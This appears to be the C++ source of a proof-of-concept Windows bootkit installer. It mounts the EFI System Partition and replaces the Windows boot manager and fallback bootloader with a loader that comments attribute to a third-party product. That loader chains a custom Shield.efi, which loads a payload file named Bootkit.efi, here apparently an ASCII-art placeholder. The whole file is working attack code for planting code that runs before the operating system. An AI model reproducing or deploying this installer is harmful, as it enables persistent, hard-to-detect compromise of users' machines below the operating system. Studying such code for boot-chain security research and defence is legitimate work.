//x86_64-w64-mingw32-windres resources.rc -O coff -o resources.res
//x86_64-w64-mingw32-g++ -static -std=c++17 -Wall -municode main.cpp resources.res -o EFIInstaller.exe -lshlwapi -lshell32

#include <windows.h>
#include <shlobj.h>
#include <shlwapi.h>
#include <iostream>
#include <string>
#include <vector>
#include <filesystem>
#include "resource.h"

#ifdef _MSC_VER
#pragma comment(lib, "shlwapi.lib")
#endif

static std::wstring to_wstring(const std::string& s) {
    if (s.empty()) return {};
    int len = ::MultiByteToWideChar(CP_UTF8, 0,
                                    s.data(), (int)s.size(),
                                    nullptr, 0);
    std::wstring w;
    w.resize(len);
    ::MultiByteToWideChar(CP_UTF8, 0,
                          s.data(), (int)s.size(),
                          &w[0], len);
    return w;
}


std::wstring FindFreeDriveLetter() {
    DWORD drives = GetLogicalDrives();
    for (wchar_t letter = L'S'; letter >= L'S'; --letter) {
        if (!(drives & (1 << (letter - L'A')))) {
            return std::wstring(1, letter) + L":";
        }
    }
    return L"";
}

bool RunCommand(const std::wstring& cmd) {
    std::wcout << L"[CMD] " << cmd << std::endl;

    STARTUPINFOW si = { sizeof(si) };
    PROCESS_INFORMATION pi;

    if (!CreateProcessW(NULL, (LPWSTR)cmd.c_str(), NULL, NULL, FALSE,
                        CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
        std::wcerr << L"[ERROR] Failed to execute: " << cmd << std::endl;
        return false;
    }

    WaitForSingleObject(pi.hProcess, INFINITE);
    DWORD exitCode;
    GetExitCodeProcess(pi.hProcess, &exitCode);
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
    return exitCode == 0;
}

bool ExtractResourceToFile(WORD resourceID, const std::wstring& outPath) {
    std::wcout << L"[INFO] Extracting to: " << outPath << std::endl;

    HRSRC hRes = FindResourceW(NULL, MAKEINTRESOURCEW(resourceID), RT_RCDATA);
    if (!hRes) {
        std::wcerr << L"[ERROR] Resource not found (ID " << resourceID << L")" << std::endl;
        return false;
    }

    HGLOBAL hData = LoadResource(NULL, hRes);
    if (!hData) {
        std::wcerr << L"[ERROR] Resource load failed (ID " << resourceID << L")" << std::endl;
        return false;
    }

    DWORD size = SizeofResource(NULL, hRes);
    void* data = LockResource(hData);
    if (!data) {
        std::wcerr << L"[ERROR] Resource lock failed (ID " << resourceID << L")" << std::endl;
        return false;
    }

    size_t pos = outPath.find_last_of(L"\\/");
    if (pos != std::wstring::npos) {
        std::wstring dir = outPath.substr(0, pos);
        if (SHCreateDirectoryExW(NULL, dir.c_str(), NULL) != ERROR_SUCCESS &&
            GetLastError() != ERROR_ALREADY_EXISTS) {
            DWORD err = GetLastError();
            std::wcerr << L"[ERROR] Could not create directory: " << dir
                       << L" (WinError: " << err << L")" << std::endl;
            return false;
        }
    }

    HANDLE hFile = CreateFileW(outPath.c_str(), GENERIC_WRITE, 0, NULL,
                               CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        DWORD err = GetLastError();
        std::wcerr << L"[ERROR] Failed to create file: " << outPath
                   << L" (WinError: " << err << L")" << std::endl;
        return false;
    }

    DWORD written;
    BOOL success = WriteFile(hFile, data, size, &written, NULL);
    CloseHandle(hFile);

    if (!success || written != size) {
        std::wcerr << L"[ERROR] Failed to write file: " << outPath
                   << L" (written: " << written << L", expected: " << size << L")"
                   << std::endl;
        return false;
    }

    return true;
}

int wmain() {
    std::wcout << L"==== EFI Resource Installer ====" << std::endl;

    // Pick an unused drive letter and mount the real EFI System Partition
    std::wstring mountLetter = FindFreeDriveLetter();
    if (mountLetter.empty()) {
        std::wcerr << L"[ERROR] No free drive letter available." << std::endl;
        return 1;
    }
    std::wcout << L"[INFO] Mounting EFI System Partition as " << mountLetter << std::endl;
    if (!RunCommand(L"mountvol " + mountLetter + L" /s")) {
        std::wcerr << L"[ERROR] mountvol /s failed." << std::endl;
        return 1;
    }

    // Backup existing .efi -> .dat in two folders
    auto backupEFI = [&](const std::wstring& folder, const std::wstring& stem) {
        std::wstring src = folder + L"\\" + stem + L".efi";
        std::wstring dst = folder + L"\\" + stem + L".dat";
        std::error_code ec;
        if (std::filesystem::exists(src)) {
            std::filesystem::rename(src, dst, ec);
            if (ec) {
                std::wstring msg = to_wstring(ec.message());
                std::wcerr << L"[ERROR] Failed to backup " << src
                           << L" -> " << dst << L": " << msg << std::endl;
            } else {
                std::wcout << L"[OK] Backed up " << src
                           << L" -> " << dst << std::endl;
            }
        } else {
            std::wcerr << L"[WARN] " << src << L" not found; skipping backup." << std::endl;
        }
    };

    std::wstring msBootDir  = mountLetter + L"\\efi\\microsoft\\boot";
    std::wstring stdBootDir = mountLetter + L"\\efi\\boot";
    //only when not handled by installer
    //backupEFI(msBootDir,  L"bootmgfw");
    //backupEFI(stdBootDir, L"bootx64");

    // Extract our resources into place
    std::vector<std::pair<WORD, std::wstring>> files = {
        { IDR_SHDLDR_EFI,     msBootDir  + L"\\bootmgfw.efi"    }, // shdloader.efi from RebootRestoreRxPro128-2710270703
        { IDR_SHDLDR_EFI,     stdBootDir + L"\\bootx64.efi"     }, // shdloader.efi from RebootRestoreRxPro128-2710270703
        { IDR_SHDMGR_EF_,     stdBootDir + L"\\shdmgr.ef_"     }, // sdhmgr.ef_ from RebootRestoreRxPro128-2710270703
        { IDR_SHIELD_EFI_BAK, stdBootDir + L"\\Shield.efi.bak"  }, // Shield.efi from RebootRestoreRxPro128-2710270703
        { IDR_SHIELD_EFI,     stdBootDir + L"\\Shield.efi"      }, // need to be loaded with original shdmgr.ef_. We place our custom loader here. This also loads Shield.efi.bak and Bootkit.efi
        { IDR_ASCIIART_EFI,   stdBootDir + L"\\Bootkit.efi"     }  // we place asciiart.efi as Bootkit.efi
    };

    for (auto const& [resId, path] : files) {
        if (!ExtractResourceToFile(resId, path)) {
            std::wcerr << L"[ERROR] Failed to extract: " << path << std::endl;
        } else {
            std::wcout << L"[OK] Copied: " << path << std::endl;
        }
    }

    std::wcout << L"[INFO] Unmounting EFI volume (" << mountLetter << L")" << std::endl;
    RunCommand(L"mountvol " + mountLetter + L" /D");

    std::wcout << L"==== Done ====" << std::endl;
    return 0;
}

